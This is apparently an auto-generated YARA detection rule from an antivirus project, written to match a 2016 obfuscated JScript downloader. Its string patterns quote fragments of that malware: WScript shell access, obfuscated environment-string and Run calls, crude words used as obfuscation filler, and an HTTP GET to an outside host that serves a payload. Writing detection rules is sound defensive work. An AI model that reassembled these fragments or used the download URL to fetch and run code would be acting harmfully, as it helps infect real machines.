rule sig_20160428_ab64c36c950e6e0f11a81869354cbd05 {
  meta:
    description = "datamaliciousorder - file 20160428_ab64c36c950e6e0f11a81869354cbd05.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5572436cdd5f49c1ea3913debaec8937df0b91adceaa4d393e3f9d442288e276"

  strings:
    $s1  = "function TlhJivGaxQzaMvbXzxWwy() {return KmgVxuTcyOxyMzrVweKco[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function LudPjhYzhRrdWlnYljTzd(GoeJaoTduDxdNejAxlPii){KmgVxuTcyOxyMzrVweKco[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function LudPjhYzhRrdWlnYljTzd(GoeJaoTduDxdNejAxlPii){KmgVxuTcyOxyMzrVweKco[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function MimDeaPidMmnZejDiuQsl() {return ((VnsRdmUojLbzJsaSsnKfv == true) && (VnsRdmUojLbzJsaSsnKfv == IrbRalClzUchMkiTeyEur)) ?" ascii
    $s5  = "var KmgVxuTcyOxyMzrVweKco = function NssJvzPduCmtGpsFdiMsl() {return GueJipYwdGmmYadCdfTck[XfqNeiWxfTlbTgjUifKhe](\"WScript\"+\"" ascii
    $s6  = "function JvkBbdUecQvjSjjUwcBip(RkqIxaYusBghKbwGsiZoo, KxdEbxCglTssDfwDpvQig){YceRttMovElzGwsOdqWst = YceRttMovElzGwsOdqWst * 1; " ascii
    $s7  = "function MimDeaPidMmnZejDiuQsl() {return ((VnsRdmUojLbzJsaSsnKfv == true) && (VnsRdmUojLbzJsaSsnKfv == IrbRalClzUchMkiTeyEur)) ?" ascii
    $s8  = "return RkqIxaYusBghKbwGsiZoo - KxdEbxCglTssDfwDpvQig;};" fullword ascii
    $s9  = "YtoYxkGwwBxkIxrQwvHoe[ZfxZswXweHmhTacIseGjv](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s10 = "var GueJipYwdGmmYadCdfTck = this[\"WScript\"];" fullword ascii
    $s11 = "var KmgVxuTcyOxyMzrVweKco = function NssJvzPduCmtGpsFdiMsl() {return GueJipYwdGmmYadCdfTck[XfqNeiWxfTlbTgjUifKhe](\"WScript\"+\"" ascii
    $s12 = "function LsrFvhQqnDfzLhmFwtRat(KrrWbsWnnKkjChrZtnMzm) {var OjwSifHqdMjsIysNzrEoz = (1, 2, 3, 4, 5, KrrWbsWnnKkjChrZtnMzm); retur" ascii
    $s13 = "function LsrFvhQqnDfzLhmFwtRat(KrrWbsWnnKkjChrZtnMzm) {var OjwSifHqdMjsIysNzrEoz = (1, 2, 3, 4, 5, KrrWbsWnnKkjChrZtnMzm); retur" ascii
    $s14 = "var IrbRalClzUchMkiTeyEur = false;" fullword ascii
    $s15 = "function TlhJivGaxQzaMvbXzxWwy() {return KmgVxuTcyOxyMzrVweKco[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s16 = "IrbRalClzUchMkiTeyEur = true; " fullword ascii
    $s17 = "function JvkBbdUecQvjSjjUwcBip(RkqIxaYusBghKbwGsiZoo, KxdEbxCglTssDfwDpvQig){YceRttMovElzGwsOdqWst = YceRttMovElzGwsOdqWst * 1; " ascii
    $s18 = "function TsrUpiBbjFghPojRdyMam(){return UzzIliSygQseLpdGttOdn + \"\";};" fullword ascii
    $s19 = "if (YtoYxkGwwBxkIxrQwvHoe[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s20 = "}while (WesHtuRunLncIclQieGnq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}